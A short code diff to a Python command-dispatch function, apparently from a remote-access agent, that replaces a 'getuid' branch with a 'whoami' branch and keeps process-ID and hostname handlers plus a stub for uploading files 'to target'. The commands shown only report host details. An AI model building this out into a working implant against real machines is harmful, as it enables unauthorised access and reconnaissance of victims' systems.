@@ -84,11 +84,7 @@ def runCommand(command):
 
   # Get process ID
   elif command.lower().startswith('getpid'):
-    result = '%s\n' % (os.getpid())
-
-  # Get current user
-  elif command.lower().startswith('getuid'):
-    result = '%s\n' % (os.environ['USERNAME']) 
+    result = '%s\n' % (os.getpid()) 
 
   # Get hostname
   elif command.lower().startswith('hostname'):
@@ -113,6 +109,10 @@ def runCommand(command):
   # Upload file to target
   #elif command.lower().startswith('upload'):
 
+  # Get current user
+  elif command.lower().startswith('whoami'):
+    result = '%s\n' % (os.getlogin())
+    
   # Else just pass and don't execute anything
   else:
     pass
